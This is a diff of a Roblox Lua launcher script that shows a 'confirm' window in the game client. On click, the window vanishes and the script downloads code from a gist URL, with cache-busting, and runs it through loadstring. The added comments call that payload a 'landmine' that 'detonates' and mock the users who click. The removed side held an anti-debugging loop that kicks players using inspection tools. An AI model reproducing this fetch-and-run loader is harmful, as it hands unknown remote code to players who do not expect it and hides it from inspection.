@@ -1,90 +1,92 @@
+-- [[ Neko Pure Confirmation Launcher - 消失版 ]]
+local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
-local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
 
--- 防偵測（保留）
-task.spawn(function()
-    while task.wait(1) do
-        for _, n in ipairs({"Dex", "Explorer", "Spy", "RemoteSpy"}) do
-            if CoreGui:FindFirstChild(n) or (LocalPlayer.PlayerGui and LocalPlayer.PlayerGui:FindFirstChild(n)) then
-                LocalPlayer:Kick("Security Alert")
-                return
-            end
-        end
-    end
-end)
-
--- UI 視窗
-local sg = Instance.new("ScreenGui")
-sg.Name = "NekoLauncher"
-sg.Parent = CoreGui
+-- 1. 介面外殼
+local sg = Instance.new("ScreenGui", CoreGui)
+sg.Name = "NekoConfirmUI"
 
 local frame = Instance.new("Frame", sg)
-frame.Size = UDim2.new(0, 340, 0, 180)
-frame.Position = UDim2.new(0.5, -170, 0.5, -90)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+frame.Size = UDim2.new(0, 300, 0, 160)
+frame.Position = UDim2.new(0.5, -150, 0.5, -80)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
+-- 粉色發光邊框（增加吸引力喵）
+local stroke = Instance.new("UIStroke", frame)
+stroke.Color = Color3.fromRGB(255, 105, 180)
+stroke.Thickness = 2
 
+-- 2. 標題文字
 local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, 0, 0, 50)
+title.Size = UDim2.new(1, 0, 0.5, 0)
 title.BackgroundTransparency = 1
-title.Text = "🐾 確認開啟 Neko 腳本？"
-title.TextColor3 = Color3.fromRGB(255, 150, 200)
-title.Font = Enum.Font.GothamBlack
+title.Text = "確認開啟貓腳本？"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBold
 title.TextSize = 22
-title.Parent = frame
 
-local executeBtn = Instance.new("TextButton", frame)
-executeBtn.Size = UDim2.new(0.8, 0, 0, 50)
-executeBtn.Position = UDim2.new(0.1, 0, 0.35, 0)
-executeBtn.Text = "立刻啟動喵～"
-executeBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 120)
-executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-executeBtn.Font = Enum.Font.GothamBold
-executeBtn.TextSize = 18
-Instance.new("UICorner", executeBtn).CornerRadius = UDim.new(0, 10)
+-- 3. 確認按鈕（點了直接蒸發並啟動）
+local yes = Instance.new("TextButton", frame)
+yes.Size = UDim2.new(0, 120, 0, 45)
+yes.Position = UDim2.new(0.08, 0, 0.55, 0)
+yes.BackgroundColor3 = Color3.fromRGB(255, 105, 180)
+yes.Text = "確認"
+yes.TextColor3 = Color3.new(1, 1, 1)
+yes.Font = Enum.Font.GothamBold
+yes.TextSize = 18
+Instance.new("UICorner", yes)
 
-local cancelBtn = Instance.new("TextButton", frame)
-cancelBtn.Size = UDim2.new(0.8, 0, 0, 40)
-cancelBtn.Position = UDim2.new(0.1, 0, 0.65, 0)
-cancelBtn.Text = "取消"
-cancelBtn.BackgroundColor3 = Color3.fromRGB(180, 80, 80)
-cancelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-cancelBtn.Font = Enum.Font.Gotham
-cancelBtn.TextSize = 16
-Instance.new("UICorner", cancelBtn).CornerRadius = UDim.new(0, 10)
+-- 4. 取消按鈕
+local no = Instance.new("TextButton", frame)
+no.Size = UDim2.new(0, 120, 0, 45)
+no.Position = UDim2.new(0.52, 0, 0.55, 0)
+no.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+no.Text = "取消"
+no.TextColor3 = Color3.fromRGB(180, 180, 180)
+no.Font = Enum.Font.GothamBold
+no.TextSize = 18
+Instance.new("UICorner", no)
 
--- 載入邏輯（用原本完整網址）
-executeBtn.MouseButton1Click:Connect(function()
-    executeBtn.Text = "載入中..."
-    executeBtn.Active = false
-    cancelBtn.Visible = false
+-- [[ 核心啟動邏輯 ]]
 
-    local url = "https://raw.githubusercontent.com/nekooocattt-NEKO/7e81681a90c5b97a61b8e90d1eedcf7b/raw/B"
-    local success, content = pcall(function()
-        return game:HttpGet(url)
+yes.MouseButton1Click:Connect(function()
+    -- 第一步：立刻消失視窗，讓雜魚沒機會後悔
+    sg:Destroy()
+    
+    -- 第二步：專心在背景跑連結
+    task.spawn(function()
+        local url = "https://gist.githubusercontent.com/nekooocattt-NEKO/7e81681a90c5b97a61b8e90d1eedcf7b/raw/B"
+        local success, content = pcall(function()
+            return game:HttpGet(url .. "?cache=" .. tick()) -- 防止緩存，保證拿到最新地雷
+        end)
+        
+        if success and content then
+            local func, err = loadstring(content)
+            if func then
+                func() -- 蹦！地雷引爆喵
+            end
+        end
     end)
-
-    if success and content and #content > 100 then
-        sg:Destroy()
-        loadstring(content)()
-    else
-        executeBtn.Text = "載入失敗，再試一次？"
-        executeBtn.Active = true
-        cancelBtn.Visible = true
-        StarterGui:SetCore("SendNotification", {
-            Title = "喵喵？",
-            Text = "載入出錯了～網路或連結問題？",
-            Duration = 5
-        })
-    end
 end)
 
-cancelBtn.MouseButton1Click:Connect(function()
+no.MouseButton1Click:Connect(function()
     sg:Destroy()
 end)
 
-print("Neko 啟動確認視窗已載入！點擊『立刻啟動喵～』才會載入腳本")
+-- 讓框框可以拖動
+local dragging, dragStart, startPos
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true; dragStart = input.Position; startPos = frame.Position
+    end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+game:GetService("UserInputService").InputEnded:Connect(function() dragging = false end)
